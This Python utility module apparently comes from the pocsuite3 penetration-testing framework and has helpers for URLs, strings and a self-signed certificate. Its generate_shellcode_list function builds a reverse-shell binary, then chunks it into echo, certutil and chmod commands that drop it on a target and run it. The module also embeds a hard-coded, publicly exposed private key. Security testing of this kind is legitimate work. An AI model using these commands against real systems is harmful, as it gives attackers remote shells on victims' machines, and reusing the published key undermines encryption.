import ast
import base64
import binascii
import os
import string
import random
from socket import gethostbyname
from urllib.parse import urlparse
from pocsuite3.lib.core.data import logger, paths
from pocsuite3.lib.core.enums import (
    CUSTOM_LOGGING, OS, OS_ARCH, SHELLCODE_CONNECTION
)
# for pocsuite 2.x
from pocsuite3.lib.core.exception import PocsuiteGenericException
from pocsuite3.shellcodes import OSShellcodes


def url2ip(url, with_port=False):
    """
    works like turning 'http://baidu.com' => '180.149.132.47'
    """

    url_prased = urlparse(url)
    if url_prased.port:
        ret = gethostbyname(url_prased.hostname), url_prased.port
    elif not url_prased.port and url_prased.scheme == 'https':
        ret = gethostbyname(url_prased.hostname), 443
    else:
        ret = gethostbyname(url_prased.hostname), 80

    return ret if with_port else ret[0]


def str_to_dict(value):
    try:
        return ast.literal_eval(value)
    except ValueError as e:
        logger.log(CUSTOM_LOGGING.ERROR, "conv string failed : {}".format(str(e)))


def random_str(length=10, chars=string.ascii_letters + string.digits):
    return ''.join(random.sample(chars, length))


def get_middle_text(text, prefix, suffix, index=0):
    """
    Simple implementation of obtaining intermediate text

    :param text:Full text to get
    :param prefix:To get the first part of the text
    :param suffix: To get the second half of the text
    :param index: Where to get it from
    :return:
    """
    try:
        index_1 = text.index(prefix, index)
        index_2 = text.index(suffix, index_1 + len(prefix))
    except ValueError:
        # logger.log(CUSTOM_LOGGING.ERROR, "text not found pro:{} suffix:{}".format(prefix, suffix))
        return ''
    return text[index_1 + len(prefix):index_2]


def generate_shellcode_list(listener_ip, listener_port, os_target=OS.WINDOWS, os_target_arch=OS_ARCH.X86,
                            chunked_num=50, profix=None, write_path=None):
    """
    Generate executable shellcode for shell rebound under Windows/Linux. When writing a POC with command execution,
    execute the list returned by this command.

    :param listener_ip: Listening IP
    :param listener_port: Listening port
    :param os_target: System type, default is Windows
    :param os_target_arch: System architecture, the default is x86
    :param chunked_num: Specify how much quantity is one piece, the default is 50
    :param profix: Select the prefix of the command execution, the default is None. Automatically select according to
            the operating system
    :param write_path: The written file directory, when the default is None, Windows will write to the %TEMP% directory,
            Linux will write to the /tmp directory, the file name is random
    :return: list of command
    """

    bad_chars = ["\x00", "\x0a", "\x0d", "\x3b"]
    s = OSShellcodes(os_target, os_target_arch, listener_ip, listener_port, bad_chars)
    connection_type = SHELLCODE_CONNECTION.REVERSE
    filename = random_str(5)
    filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename)
    if os_target == OS.WINDOWS:
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename) + '.exe'
    shellcode = s.create_shellcode(
        connection_type,
        encode='',
        make_exe=1,
        debug=0,
        # dll_inj_funcs=dll_funcs,
        filename=filename,
        # use_precompiled=False
    )
    if not os.path.exists(filepath):
        raise PocsuiteGenericException("generate file does not exist!")
    with open(filepath, 'rb') as f:
        data = f.read()

    os.unlink(filepath)
    if profix is None:
        if os_target == OS.WINDOWS:
            profix = "cmd.exe /q /c "
        elif os_target == OS.LINUX:
            profix = ""

    index = 0
    cmd = []
    rand_str = random_str(4)
    if os_target == OS.WINDOWS:
        data = base64.b64encode(data).decode()
        length = len(data)

        if write_path is None:
            write_path = "%TEMP%"
        filename = r"{path}\{rand}.bs4".format(path=write_path, rand=rand_str)
        filename_out = r"{path}\{rand}.exe".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break
            _cmd = data[index:index + chunked_num]
            flag = ">>"
            if index == 0:
                flag = ">"
            cmd.append(profix + r"echo {payload} {flag} {filename}".format(payload=_cmd, flag=flag, filename=filename))
            index = index + chunked_num
        cmd.append(profix + "certutil -decode {input} {output}".format(input=filename, output=filename_out))
        cmd.append(profix + filename_out)
    elif os_target == OS.LINUX:
        length = len(data)
        echo_prefix = "\\x"
        if write_path is None:
            write_path = "/tmp"
        filename = r"{path}/{rand}".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break

            block = str(binascii.hexlify(data[index:index + chunked_num]), "utf-8")
            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
            command = profix + 'echo -ne "{}" >> {}'.format(block, filename)
            cmd.append(command)
            index = index + chunked_num
        cmd.append("chmod u+x " + filename)
        cmd.append(profix + filename)

    return cmd


def gen_cert(emailAddress="s1@seebug.org",
             commonName="Cyberspace",
             countryName="CN",
             localityName="Cyberspace",
             stateOrProvinceName="Cyberspace",
             organizationName="Seebug",
             organizationUnitName="pocsuite.org",
             serialNumber=0,
             validityStartInSeconds=0,
             validityEndInSeconds=10*365*24*60*60,
             filepath="cacert.pem"):

    # openssl library dependencies is too heavy, so we move it to extras_require
    try:
        from OpenSSL import crypto
        # create a key pair
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 4096)
        # create a self-signed cert
        cert = crypto.X509()
        cert.get_subject().C = countryName
        cert.get_subject().ST = stateOrProvinceName
        cert.get_subject().L = localityName
        cert.get_subject().O = organizationName
        cert.get_subject().OU = organizationUnitName
        cert.get_subject().CN = commonName
        cert.get_subject().emailAddress = emailAddress
        cert.set_serial_number(serialNumber)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        with open(filepath, "wb+") as fw:
            fw.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(filepath, "ab+") as fw:
            fw.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    except ImportError:
        logger.warning('pyOpenSSL not installed, use hard-code certificate instead')
        hard_coded_cert = (
            '-----BEGIN CERTIFICATE-----\n'
            'MIIFmjCCA4ICAQAwDQYJKoZIhvcNAQENBQAwgZIxCzAJBgNVBAYTAkNOMRMwEQYD\n'
            'VQQIDApDeWJlcnNwYWNlMRMwEQYDVQQHDApDeWJlcnNwYWNlMQ8wDQYDVQQKDAZT\n'
            'ZWVidWcxFTATBgNVBAsMDHBvY3N1aXRlLm9yZzETMBEGA1UEAwwKQ3liZXJzcGFj\n'
            'ZTEcMBoGCSqGSIb3DQEJARYNczFAc2VlYnVnLm9yZzAeFw0yMTA3MjcwODE5NDRa\n'
            'Fw0zMTA3MjUwODE5NDRaMIGSMQswCQYDVQQGEwJDTjETMBEGA1UECAwKQ3liZXJz\n'
            'cGFjZTETMBEGA1UEBwwKQ3liZXJzcGFjZTEPMA0GA1UECgwGU2VlYnVnMRUwEwYD\n'
            'VQQLDAxwb2NzdWl0ZS5vcmcxEzARBgNVBAMMCkN5YmVyc3BhY2UxHDAaBgkqhkiG\n'
            '9w0BCQEWDXMxQHNlZWJ1Zy5vcmcwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIK\n'
            'AoICAQDbTiEscFDxB0LQFNi3f7on1/0bNmmJXEvKc65PP/5yRk2isuLSxo1G6JMR\n'
            'EIGKFOQOfP77ipD7QSrct4RTKlI6ND1dJPyIbdJR0/TWslU5lpBJQynzwltFrQaU\n'
            'jTeH2p1I613U/6DEt1lga4liytPoa8C38MD2glGZKMKibmIK4x/A7kNwmqr+5emk\n'
            'kwa+Z8ig04ANCvJd9cZqmb5JvjsuczG5QnG6kaANhl9pfRJO3K/lBemzFwKhEMiD\n'
            'WZZrEll369HrxbB4nhJFSC0Mov34YdRbwmM0CdvaIPYifnn+0GRtKE6mp6OTA/8s\n'
            'u/HbmNSTGdnLCyaVN3K1aYL9vEQ1JOq0x24X+Bv4oXr0LXdWGsMQL3xsW3shzpXb\n'
            'iepWjcpTcJtxUHs2AFe9YhioxjvcZ7ESoXQUxEDdj0aigKVwDQ7Yw6owOhmgq+jA\n'
            'v0M8WsKUC6ModCMP+NvbxErm0h+u3RDmfgYwY13FcLPLNT3BErC/dPycRAPf9aQt\n'
            'IeWJ9iQVGRwFMSytST5bMzD33qmSXeUPo37TcElBHB3W5gR1veUi8jSVRn0sb+Vv\n'
            'xQkeA5jdqAPorLs0gtSdvw4XTLyYeVZQF/MTNiPnWFFXkeoF+aByr9E3l1OdB5Vs\n'
            'tb7roSXQ+A7m0+tSO9eIZchMwAtpO7AYP/5rd1mAL0f8DTs5dQIDAQABMA0GCSqG\n'
            'SIb3DQEBDQUAA4ICAQAqwodpcxanrxDv+jpAnmk3cEhCNqua6y5URypjM3a2O9FN\n'
            'CcwYjec4mGv/RVxucKWNdQAUazYX1PiuAs1JgUPQhgge5aNB83YP69gvXfZQzSNv\n'
            'aWLrNmwKxOYuFsiexiKsq4ZMppZWMqDQbzS8NZDelTBYV9eyc6ztReu8/4GsqW5g\n'
            'UA2g8Jqpfm+V9B/N8lF69bL4l/+K+cG3qYywYT37re2eft8aqkYnRUyPOyl9pkme\n'
            'jdBvn65p0j5FyLrRKMhf2YYFUBWWyyBwtnlnt8Uj8YfnzwThAoJpziN56FF7Zxfw\n'
            'yKoRWccnyyx2qqSpvCNMVQ5vGwEEoeJwJIKbpik4ah8hZVxdnc7zFEOCo2Hy5+65\n'
            'ZxFm//n6cNr6xonQ6VTZwetXOQZh/rnCyze0iVw8J4G+l3KoFNX3Ovzoh/WMAw6O\n'
            '/O41/248XGQmyKmth4LD0y4W0A1+PSiWn+oCax5QnST13J13mONYWZxDn6oDdJ46\n'
            'hi7sbfqZot21lHWHE9B0ZUvIBkZBQVKcGt9tPWx0KUlOI9VoMHxgp5hdHLbu86pn\n'
            'B+kvYtnxw7ayzn2/rmwSXx4e91cqufW/T1r/jiU7pBLq5oDIMiw2h1nr0bjue3Tf\n'
            'UihJLHGgggHtEFGqzqqmO3jOCM+ys8aT64CuMp5HgZmf1FePXWp7m9ZYCiKHmw==\n'
            '-----END CERTIFICATE-----\n'
            '-----BEGIN PRIVATE KEY-----\n'
            'MIIJRAIBADANBgkqhkiG9w0BAQEFAASCCS4wggkqAgEAAoICAQDbTiEscFDxB0LQ\n'
            'FNi3f7on1/0bNmmJXEvKc65PP/5yRk2isuLSxo1G6JMREIGKFOQOfP77ipD7QSrc\n'
            't4RTKlI6ND1dJPyIbdJR0/TWslU5lpBJQynzwltFrQaUjTeH2p1I613U/6DEt1lg\n'
            'a4liytPoa8C38MD2glGZKMKibmIK4x/A7kNwmqr+5emkkwa+Z8ig04ANCvJd9cZq\n'
            'mb5JvjsuczG5QnG6kaANhl9pfRJO3K/lBemzFwKhEMiDWZZrEll369HrxbB4nhJF\n'
            'SC0Mov34YdRbwmM0CdvaIPYifnn+0GRtKE6mp6OTA/8su/HbmNSTGdnLCyaVN3K1\n'
            'aYL9vEQ1JOq0x24X+Bv4oXr0LXdWGsMQL3xsW3shzpXbiepWjcpTcJtxUHs2AFe9\n'
            'YhioxjvcZ7ESoXQUxEDdj0aigKVwDQ7Yw6owOhmgq+jAv0M8WsKUC6ModCMP+Nvb\n'
            'xErm0h+u3RDmfgYwY13FcLPLNT3BErC/dPycRAPf9aQtIeWJ9iQVGRwFMSytST5b\n'
            'MzD33qmSXeUPo37TcElBHB3W5gR1veUi8jSVRn0sb+VvxQkeA5jdqAPorLs0gtSd\n'
            'vw4XTLyYeVZQF/MTNiPnWFFXkeoF+aByr9E3l1OdB5Vstb7roSXQ+A7m0+tSO9eI\n'
            'ZchMwAtpO7AYP/5rd1mAL0f8DTs5dQIDAQABAoICAAVyn2hXMeuK3qIEoo2MYrdy\n'
            'qhru8xgybr+MuBvH3y4/iNYt02yg+gl05ZJa8pzXgALMIBlni8pyB/qLpIHcX0aK\n'
            '3ateq9dHwx29QivDKlLP5q2rOXOQtGu6rJssFuENETMqhZ4w63F3jITUpwkJONJh\n'
            'OtxW4rQ88IH5fTxDubPDiJpmUM6PSQgj9fXcoSJBub4lAt1QFE05OcCUKSHz08yH\n'
            'mAieGe0kiPFNETmxna7P1J6/0tpcC/isTg7VPuNSBV7xQLm2o3eblaCa9mOF+QEe\n'
            'jQPqhERaqld00ihxM96clqIPikShjXKter1FvfBSj5VH4x0kHcU/J15STKq47ojH\n'
            'plpNAT0qknaH/snHc3WSVf4uWsjR8wN6UV/dCe+jGQmoLKRSbySyFO+UKTdUnjPh\n'
            'wiXVKJq0D4whsdAGUFCKwOEzg8Wh2VV2vYQy+QXvWEwrXXpzY5xc9lLz2XgkQ2q6\n'
            'oGiYM21dzQlYRyLKHveJoGahfkB0vR7sRzyM6H4csCopshCeqXoS+fF5f6XLLRBq\n'
            'v1UAz9+4i4v2AKs1zrMI69b04MvKfFuwFH5M6xVMvfacjGCJ5j1DySdoAC1XCqgf\n'
            'Y+hPP/CDj6G3JM7Z2gVTX8VajWsTHhY+ona7Z8ZZ2y/nftLpYcMEH4iFlFj2IaBt\n'
            'zzZAMJWgd99+nXHrCotRAoIBAQD1wzibXECzsronWROuDufdvNY4nNXW3UV0uAXs\n'
            '5HQbD3BSOqhf/Sgnt2cK3M4/2gWdJCBvAjhqg6P9vWiwaEgf6qvkkCN1EKTsc1Me\n'
            'JtT38eSWR9Tc6Lew6BgKRDL71SQsu2V0pdNLpXuxPhyHhlJoeOrxkOeDOg16ibww\n'
            'Bfe1nGBswWOJiIhCMlr3kfeW7KUA1T++89afgR1FiLnXxodlPSXPT2mu9QQlBEeO\n'
            '+enp57YorWFWc1G7fsww3NR0xsz4wSSVz4NAoMk3n9UiKK0EsghbDZHs5IKjMNgM\n'
            'RGfG+KOmYA3MyZ0T1uqWrb43irS4gECdMOomTkcE2PTaEwADAoIBAQDkcMU8fvG2\n'
            '8jDhtWlEFoAyZmGJRt9dpS8rL+OzYj19URkFfGHuD3z8OOveV5v3XBl4dl3dJcY7\n'
            'MY7qjBm3Bp0QxTRbfUAXmIB0I9NzAJXfojdftj6ylFRqwNReIH4Zqa2XT1YrVq6r\n'
            'J8EMwAzUcBhmS+rb+Es9tb9kHra9gL9alvt094P6VqmseB3iIK9TPU5CDfbeHXWE\n'
            'KOzfShKaNP4he1l8QETdU5v1TttAiOEZztGPOMuKDORY4ZT9lvJ0lG637ee1rVlQ\n'
            'sXZhFTSm+DL/c6W4VpNXOWytPqBRp4a9oUOKfgltjTPqltghXXWc2j+bxil/wyfV\n'
            'hoL+4q3OchMnAoIBAQC6Z3QMApDgu3MOXTXcE1oyiQRCtFJNQk9oFBwKbczSqYcc\n'
            'F3mWNMG8PhNd3dRiAc+4PKqNCDYaM/aygnNhOfdanff6yIjcRd+RqHcmq3VlCofC\n'
            'pIEDfU+2UpPJVakF8cgaVZjCPPRisAV9jgq9kFf4/Z3V036FvgZzJv0hv6T+jrlk\n'
            'Q9pnerM+4kq09HXCd4M/en97Kh9jo9672tR6oQ4Y76Q59ZXHKfgWy4QrIcsVqrYz\n'
            'bC4kEBuyBp6BgT1zxUW6d2R0bIy0/D8ifYx++DMjGJXV2hkQgNHFTUrRIyFDfVtC\n'
            '2iAdb95AKgaMewOHxSEFv+FCWNOAcmbTemtc7IRZAoIBAQDP9lG4hyBpmgYiFFKm\n'
            'Z42BVG8K1/hUeiJ8wHYcQh0UTpXmxpsoa/UucGtZ2IvmHnQZlDhTMSZLkQw4Ph7S\n'
            '3jRypfTKLTYBxRV7pXnDwg6urjCW84QUcrB/Fti+b/ocRrn/e3xIq/sLWX+HqfaE\n'
            'FyA/UHGYm2tz3FdGQCfAUMrjH3v/uazuY6LHnfomd/bkYnUx8SCCiHMJQ3CQvhA9\n'
            'Tmzj8jU+xgtrKchbA9TZ5UJ3ii6AogW5wY7H02UdjyNeOhqpWu2MGSmsKkJIk1OB\n'
            'hYZ3w8JkFHzB9UcYWGD+tPIXBA5GsALJNrjCoVxU045UouMxXq883l8PJgtvGtF7\n'
            'laIVAoIBAQCc//sMNW41H/Tdr9wjydLdiZNCSxxUTBgogZoPFP4kiL9ZDrpOr6sB\n'
            'jv/casArTxApY3kcVyEvp6wuPa2EjFwDFcTKvtD3gW0D0x619+fnuLCK/LDlZDyb\n'
            'R6XKCVqsmau1oiHny80OQy1qFQ3GUS2S0D6jNLkrxxNqgBtXUv43u70Hz6YF94CI\n'
            'fSqRy2bWH6CwKG9c6Tta7CUEmp7bTVZzlovPam2xQ8Z8kIyoeF+DlWNj8uoU2ysM\n'
            'WvaGT4wkJPGsrInzMepzkHO59kxrDU/YywQWMJIq1je/L5eVhDn4kLBU8QLo7EBh\n'
            'DMPYZETjvRMhhfabteXJMB3EJz0zW7PB\n'
            '-----END PRIVATE KEY-----'
        )
        with open(filepath, "w+") as fw:
            fw.write(hard_coded_cert)
